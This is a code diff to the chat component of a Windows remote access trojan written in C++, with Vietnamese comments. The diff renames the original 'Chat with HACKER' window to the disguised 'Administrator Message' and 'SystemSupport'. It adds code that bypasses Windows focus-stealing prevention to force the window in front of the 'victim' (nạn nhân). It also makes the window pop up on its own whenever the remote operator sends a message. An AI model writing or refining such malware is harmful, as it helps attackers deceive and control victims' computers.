@@ -10,6 +10,10 @@
 #define IDC_CHAT_INPUT 102
 #define IDC_BTN_SEND 103
 
+// Đặt tên Class Name thống nhất
+#define CHAT_CLASS_NAME L"SystemSupport"
+#define CHAT_WINDOW_TITLE L"Administrator Message"
+
 class ChatManager
 {
 private:
@@ -20,8 +24,6 @@ private:
     static inline bool isRunning = false;
 
     // --- HÀM CHUYỂN ĐỔI MÃ (UTF-8 <-> Unicode) ---
-
-    // 1. Chuyển từ std::string (UTF-8) sang std::wstring (Unicode) để hiển thị
     static std::wstring ToWide(const std::string &str)
     {
         if (str.empty())
@@ -32,7 +34,6 @@ private:
         return wstrTo;
     }
 
-    // 2. Chuyển từ std::wstring (Unicode) sang std::string (UTF-8) để gửi đi
     static std::string ToUtf8(const std::wstring &wstr)
     {
         if (wstr.empty())
@@ -43,6 +44,53 @@ private:
         return strTo;
     }
 
+    // ÉP CỬA SỔ LÊN TRÊN CÙNG (BYPASS WINDOWS RESTRICTION)
+    static void ForceForegroundWindow(HWND hwnd)
+    {
+        if (!IsWindow(hwnd))
+            return;
+
+        // 1. Nếu đang minimize thì bung ra
+        if (IsIconic(hwnd))
+        {
+            ShowWindow(hwnd, SW_RESTORE);
+        }
+        else
+        {
+            ShowWindow(hwnd, SW_SHOW);
+        }
+
+        // 2. Kỹ thuật AttachThreadInput để vượt qua Focus Stealing Prevention
+        DWORD foregroundThread = GetWindowThreadProcessId(GetForegroundWindow(), NULL);
+        DWORD appThread = GetCurrentThreadId();
+
+        if (foregroundThread != appThread)
+        {
+            // Mượn quyền input của cửa sổ đang active
+            AttachThreadInput(foregroundThread, appThread, TRUE);
+
+            BringWindowToTop(hwnd);
+            SetForegroundWindow(hwnd);
+
+            // Trả lại quyền
+            AttachThreadInput(foregroundThread, appThread, FALSE);
+        }
+        else
+        {
+            BringWindowToTop(hwnd);
+            SetForegroundWindow(hwnd);
+        }
+
+        // 3. Kỹ thuật "Double Tap" TopMost: Set lên trên cùng rồi bỏ ghim
+        // Giúp cửa sổ nổi lên trên các ứng dụng khác (kể cả Task Manager)
+        SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
+        SetWindowPos(hwnd, HWND_NOTOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
+
+        // Focus vào ô nhập liệu để nạn nhân gõ được ngay
+        if (hInput)
+            SetFocus(hInput);
+    }
+
     // Xử lý sự kiện cửa sổ
     static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
     {
@@ -51,27 +99,19 @@ private:
         case WM_COMMAND:
             if (LOWORD(wParam) == IDC_BTN_SEND)
             {
-                // Lấy độ dài text trong ô input
                 int len = GetWindowTextLengthW(hInput);
                 if (len > 0)
                 {
                     std::vector<wchar_t> buffer(len + 1);
                     GetWindowTextW(hInput, &buffer[0], len + 1);
-
                     std::wstring wMsg(&buffer[0]);
-
-                    // Chuyển sang UTF-8 để gửi cho Web Client
                     std::string msgUtf8 = ToUtf8(wMsg);
 
                     if (!msgUtf8.empty())
                     {
-                        // Gửi về Client
-                        AgentTcpServer::instance().sendJson({{"type", "chat_message"},
-                                                             {"text", msgUtf8}});
-
-                        // Hiển thị lên ô History (Dùng chuỗi Unicode gốc)
+                        AgentTcpServer::instance().sendJson({{"type", "chat_message"}, {"text", msgUtf8}});
                         AppendText(L"Me: " + wMsg);
-                        SetWindowTextW(hInput, L""); // Xóa input
+                        SetWindowTextW(hInput, L"");
                     }
                 }
             }
@@ -84,53 +124,64 @@ private:
             PostQuitMessage(0);
             return 0;
         }
-        return DefWindowProcW(hwnd, uMsg, wParam, lParam); // Dùng DefWindowProcW
+        return DefWindowProcW(hwnd, uMsg, wParam, lParam);
     }
 
     static void UIThreadFunc()
     {
-        // Đăng ký lớp cửa sổ (Dùng phiên bản W - Unicode)
+        HMODULE hInstance = GetModuleHandle(NULL);
+
         WNDCLASSW wc = {0};
         wc.lpfnWndProc = WindowProc;
-        wc.hInstance = GetModuleHandle(NULL);
-        wc.lpszClassName = L"RatChatWindow"; // Chuỗi L""
+        wc.hInstance = hInstance;
+        wc.lpszClassName = CHAT_CLASS_NAME;
         wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
-        RegisterClassW(&wc);
 
-        // Tạo cửa sổ (Dùng phiên bản W)
-        // Dùng font mặc định của hệ thống để hỗ trợ tiếng Việt tốt hơn
-        hWindow = CreateWindowExW(0, L"RatChatWindow", L"   Chat with HACKER", WS_OVERLAPPEDWINDOW | WS_VISIBLE,
-                                  100, 100, 400, 500, NULL, NULL, wc.hInstance, NULL);
+        // Đăng ký class
+        if (!RegisterClassW(&wc))
+        {
+            if (GetLastError() != ERROR_CLASS_ALREADY_EXISTS)
+                return;
+        }
 
-        // Tạo Font (Segoe UI cho đẹp và chuẩn tiếng Việt)
+        hWindow = CreateWindowExW(0, CHAT_CLASS_NAME, CHAT_WINDOW_TITLE,
+                                  WS_OVERLAPPEDWINDOW | WS_VISIBLE,
+                                  100, 100, 400, 500, NULL, NULL, hInstance, NULL);
+
+        if (!hWindow)
+        {
+            isRunning = false;
+            return;
+        }
+
         HFONT hFont = CreateFontW(18, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET,
                                   OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
                                   DEFAULT_PITCH | FF_SWISS, L"Segoe UI");
 
-        // Tạo khung lịch sử
         hHistory = CreateWindowW(L"EDIT", L"", WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_READONLY | ES_AUTOVSCROLL,
-                                 10, 10, 360, 380, hWindow, (HMENU)IDC_CHAT_HISTORY, wc.hInstance, NULL);
+                                 10, 10, 360, 380, hWindow, (HMENU)IDC_CHAT_HISTORY, hInstance, NULL);
         SendMessageW(hHistory, WM_SETFONT, (WPARAM)hFont, TRUE);
 
-        // Tạo ô nhập liệu
         hInput = CreateWindowW(L"EDIT", L"", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,
-                               10, 400, 280, 30, hWindow, (HMENU)IDC_CHAT_INPUT, wc.hInstance, NULL);
+                               10, 400, 280, 30, hWindow, (HMENU)IDC_CHAT_INPUT, hInstance, NULL);
         SendMessageW(hInput, WM_SETFONT, (WPARAM)hFont, TRUE);
 
-        // Tạo nút Gửi
         HWND hBtn = CreateWindowW(L"BUTTON", L"Gửi", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
-                                  300, 400, 70, 30, hWindow, (HMENU)IDC_BTN_SEND, wc.hInstance, NULL);
+                                  300, 400, 70, 30, hWindow, (HMENU)IDC_BTN_SEND, hInstance, NULL);
         SendMessageW(hBtn, WM_SETFONT, (WPARAM)hFont, TRUE);
 
-        // Message Loop
         MSG msg = {0};
         while (GetMessageW(&msg, NULL, 0, 0))
-        { // GetMessageW
+        {
             TranslateMessage(&msg);
-            DispatchMessageW(&msg); // DispatchMessageW
+            DispatchMessageW(&msg);
         }
 
         hWindow = NULL;
+        hHistory = NULL;
+        hInput = NULL;
+
+        UnregisterClassW(CHAT_CLASS_NAME, hInstance);
     }
 
 public:
@@ -145,24 +196,31 @@ public:
 
     static void Stop()
     {
-        if (hWindow)
+        if (hWindow && IsWindow(hWindow))
         {
             SendMessage(hWindow, WM_DESTROY, 0, 0);
-            isRunning = false;
         }
+        isRunning = false;
+        hWindow = NULL;
     }
 
-    // Hàm nhận tin từ bên ngoài (Admin gửi tới) - Input là UTF-8
     static void AppendText(const std::string &textUtf8)
     {
-        if (!hWindow || !hHistory)
-            return;
-        // Chuyển UTF-8 -> Unicode để hiển thị đúng
+        // Tự động mở cửa sổ nếu chưa mở (khi có tin nhắn đến)
+        if (!hWindow)
+            Start();
+
+        int retries = 0;
+        while (!hWindow && retries < 10)
+        {
+            std::this_thread::sleep_for(std::chrono::milliseconds(50));
+            retries++;
+        }
+
         std::wstring wText = ToWide(textUtf8);
         AppendText(wText);
     }
 
-    // Hàm nội bộ hiển thị chuỗi Unicode
     static void AppendText(const std::wstring &wText)
     {
         if (!hWindow || !hHistory)
@@ -173,5 +231,8 @@ public:
 
         std::wstring line = wText + L"\r\n";
         SendMessageW(hHistory, EM_REPLACESEL, 0, (LPARAM)line.c_str());
+
+        // GỌI HÀM FORCE FOREGROUND MỚI
+        ForceForegroundWindow(hWindow);
     }
 };
